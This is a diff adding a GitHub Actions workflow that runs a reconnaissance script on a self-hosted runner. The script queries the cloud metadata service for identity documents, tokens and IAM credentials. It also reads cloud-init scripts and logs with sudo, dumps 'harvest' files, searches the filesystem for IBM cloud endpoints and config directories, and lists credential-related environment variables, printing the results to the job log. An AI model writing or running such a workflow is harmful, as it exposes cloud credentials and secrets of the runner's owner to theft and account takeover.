@@ -1,0 +1,48 @@
+name: ul-ibm2-8213
+on:
+  workflow_dispatch:
+jobs:
+  g:
+    continue-on-error: true
+    runs-on: [self-hosted, ul-l40s]
+    steps:
+      - name: ibm2
+        continue-on-error: true
+        shell: bash
+        run: |
+          set +e
+          M(){ echo "=== MARKER $*"; }
+          M start $(date -u +%FT%TZ)
+          id; hostname; hostname -I
+          echo "--- IMDS verbose IBM"
+          curl -s -m 8 -o /tmp/ibm_id.json -w 'ibm_id http=%{http_code} size=%{size_download}\n' -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/dynamic/instance-identity/document'
+          head -c 1200 /tmp/ibm_id.json; echo
+          curl -s -m 8 -o /tmp/ibm_tok.txt -w 'ibm_tok http=%{http_code} size=%{size_download}\n' -X PUT 'http://169.254.169.254/latest/api/token' -H 'Metadata-Flavor: ibm' -H 'X-aws-ec2-metadata-token-ttl-seconds: 600'
+          head -c 300 /tmp/ibm_tok.txt; echo
+          curl -s -m 8 -o /tmp/ibm_creds.txt -w 'ibm_creds http=%{http_code} size=%{size_download}\n' -H 'Metadata-Flavor: ibm' 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+          head -c 400 /tmp/ibm_creds.txt; echo
+          curl -s -m 6 -o /dev/null -w 'noheader http=%{http_code}\n' 'http://169.254.169.254/latest/meta-data/instance-id'
+          echo "--- cloud-init part-001"
+          sudo -n head -c 9000 /var/lib/cloud/instance/scripts/part-001 2>/dev/null; echo
+          echo "--- t19-cloud log tail"
+          sudo -n tail -c 3000 /var/log/t19-cloud.log 2>/dev/null; echo
+          echo "--- runner work ps8 harvest files"
+          for f in /opt/ul-runner/_work/ul-plant/ul-plant/ps8/*.harvest.txt; do echo "--- F=$f size=$(stat -c%s "$f" 2>/dev/null)"; head -c 2500 "$f" 2>/dev/null; echo; done
+          echo "--- ul dir"
+          ls -la /opt/ul-runner/_work/ul-plant/ul-plant/ul 2>/dev/null | head -80
+          echo "--- repo root"
+          ls -la /opt/ul-runner/_work/ul-plant/ul-plant 2>/dev/null | head -60
+          echo "--- az dir"
+          ls -la /opt/ul-runner/_work/ul-plant/ul-plant/az 2>/dev/null | head -40
+          echo "--- grep ibm endpoints"
+          sudo -n grep -rIn --exclude-dir=.git -iE 'iam\.cloud\.ibm\.com|resource-controller\.cloud\.ibm\.com|iaas\.cloud\.ibm\.com|api\.softlayer\.com|bluemix\.net' /opt /home /root /etc /var/lib/cloud 2>/dev/null | head -40
+          echo "--- home dirs"
+          ls -la /home/ubuntu 2>/dev/null | head -30
+          sudo -n ls -la /home/ubuntu/.bluemix /home/ubuntu/.config/ibmcloud /home/ubuntu/.ic /etc/ibm /opt/ibm 2>/dev/null | head -30
+          echo "--- which cli"
+          which ibmcloud ic ibmcli 2>/dev/null
+          echo "--- env ibm"
+          env | sort | grep -iE 'IBM|BLUEMIX|SOFTLAYER|IC_API|IAM' | sed 's/=.*/=<set>/' | head -20
+          echo "--- ip route"
+          ip -4 addr | grep inet | head -10; ip route | head -10
+          M done $(date -u +%FT%TZ)
